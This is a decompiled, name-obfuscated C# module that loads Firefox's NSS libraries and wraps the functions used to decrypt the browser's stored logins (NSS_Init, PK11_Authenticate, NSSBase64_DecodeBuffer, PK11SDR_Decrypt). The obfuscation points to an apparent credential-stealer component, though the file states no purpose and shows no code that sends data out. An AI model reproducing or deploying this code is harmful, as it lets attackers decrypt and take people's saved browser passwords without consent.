using System;
using System.Runtime.InteropServices;
using System.Text;
using Microsoft.VisualBasic.CompilerServices;

// Token: 0x02000011 RID: 17
[StandardModule]
internal sealed class Class5
{
	// Token: 0x0600002F RID: 47
	[DllImport("kernel32.dll")]
	private static extern IntPtr LoadLibrary(string string_1);

	// Token: 0x06000030 RID: 48
	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern IntPtr GetProcAddress(IntPtr intptr_1, string string_1);

	// Token: 0x06000031 RID: 49 RVA: 0x00003D34 File Offset: 0x00001F34
	public static long smethod_0(string string_1)
	{
		string str = Environment.GetEnvironmentVariable("PROGRAMFILES") + "\\Mozilla Firefox\\";
		Class5.LoadLibrary(str + "mozutils.dll");
		Class5.LoadLibrary(str + "mozglue.dll");
		Class5.LoadLibrary(str + "mozcrt19.dll");
		Class5.LoadLibrary(str + "nspr4.dll");
		Class5.LoadLibrary(str + "plc4.dll");
		Class5.LoadLibrary(str + "plds4.dll");
		Class5.LoadLibrary(str + "ssutil3.dll");
		Class5.LoadLibrary(str + "mozsqlite3.dll");
		Class5.LoadLibrary(str + "nssutil3.dll");
		Class5.LoadLibrary(str + "softokn3.dll");
		Class5.intptr_0 = Class5.LoadLibrary(str + "nss3.dll");
		IntPtr procAddress = Class5.GetProcAddress(Class5.intptr_0, "NSS_Init");
		Class5.DLLFunctionDelegate dllfunctionDelegate = (Class5.DLLFunctionDelegate)Marshal.GetDelegateForFunctionPointer(procAddress, typeof(Class5.DLLFunctionDelegate));
		return dllfunctionDelegate(string_1);
	}

	// Token: 0x06000032 RID: 50 RVA: 0x00003E44 File Offset: 0x00002044
	public static long smethod_1()
	{
		IntPtr procAddress = Class5.GetProcAddress(Class5.intptr_0, "PK11_GetInternalKeySlot");
		Class5.DLLFunctionDelegate2 dllfunctionDelegate = (Class5.DLLFunctionDelegate2)Marshal.GetDelegateForFunctionPointer(procAddress, typeof(Class5.DLLFunctionDelegate2));
		return dllfunctionDelegate();
	}

	// Token: 0x06000033 RID: 51 RVA: 0x00003E80 File Offset: 0x00002080
	public static long smethod_2(long long_0, bool bool_0, long long_1)
	{
		IntPtr procAddress = Class5.GetProcAddress(Class5.intptr_0, "PK11_Authenticate");
		Class5.DLLFunctionDelegate3 dllfunctionDelegate = (Class5.DLLFunctionDelegate3)Marshal.GetDelegateForFunctionPointer(procAddress, typeof(Class5.DLLFunctionDelegate3));
		return dllfunctionDelegate(long_0, bool_0, long_1);
	}

	// Token: 0x06000034 RID: 52 RVA: 0x00003EBC File Offset: 0x000020BC
	public static int smethod_3(IntPtr intptr_1, IntPtr intptr_2, StringBuilder stringBuilder_0, int int_0)
	{
		IntPtr procAddress = Class5.GetProcAddress(Class5.intptr_0, "NSSBase64_DecodeBuffer");
		Class5.DLLFunctionDelegate4 dllfunctionDelegate = (Class5.DLLFunctionDelegate4)Marshal.GetDelegateForFunctionPointer(procAddress, typeof(Class5.DLLFunctionDelegate4));
		return dllfunctionDelegate(intptr_1, intptr_2, stringBuilder_0, int_0);
	}

	// Token: 0x06000035 RID: 53 RVA: 0x00003EFC File Offset: 0x000020FC
	public static int smethod_4(ref Class5.TSECItem tsecitem_0, ref Class5.TSECItem tsecitem_1, int int_0)
	{
		IntPtr procAddress = Class5.GetProcAddress(Class5.intptr_0, "PK11SDR_Decrypt");
		Class5.DLLFunctionDelegate5 dllfunctionDelegate = (Class5.DLLFunctionDelegate5)Marshal.GetDelegateForFunctionPointer(procAddress, typeof(Class5.DLLFunctionDelegate5));
		return dllfunctionDelegate(ref tsecitem_0, ref tsecitem_1, int_0);
	}

	// Token: 0x04000023 RID: 35
	private static IntPtr intptr_0;

	// Token: 0x04000024 RID: 36
	public static string string_0;

	// Token: 0x02000012 RID: 18
	public class Class6
	{
		// Token: 0x06000036 RID: 54 RVA: 0x000020EB File Offset: 0x000002EB
		public Class6()
		{
		}

		// Token: 0x04000025 RID: 37
		public static long long_0;

		// Token: 0x04000026 RID: 38
		public static byte[] byte_0;
	}

	// Token: 0x02000013 RID: 19
	public struct TSECItem
	{
		// Token: 0x04000027 RID: 39
		public int int_0;

		// Token: 0x04000028 RID: 40
		public int int_1;

		// Token: 0x04000029 RID: 41
		public int int_2;
	}

	// Token: 0x02000014 RID: 20
	// (Invoke) Token: 0x0600003A RID: 58
	[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
	public delegate long DLLFunctionDelegate(string configdir);

	// Token: 0x02000015 RID: 21
	// (Invoke) Token: 0x0600003E RID: 62
	[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
	public delegate long DLLFunctionDelegate2();

	// Token: 0x02000016 RID: 22
	// (Invoke) Token: 0x06000042 RID: 66
	[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
	public delegate long DLLFunctionDelegate3(long slot, bool loadCerts, long wincx);

	// Token: 0x02000017 RID: 23
	// (Invoke) Token: 0x06000046 RID: 70
	[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
	public delegate int DLLFunctionDelegate4(IntPtr arenaOpt, IntPtr outItemOpt, StringBuilder inStr, int inLen);

	// Token: 0x02000018 RID: 24
	// (Invoke) Token: 0x0600004A RID: 74
	[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
	public delegate int DLLFunctionDelegate5(ref Class5.TSECItem data, ref Class5.TSECItem result, int cx);
}
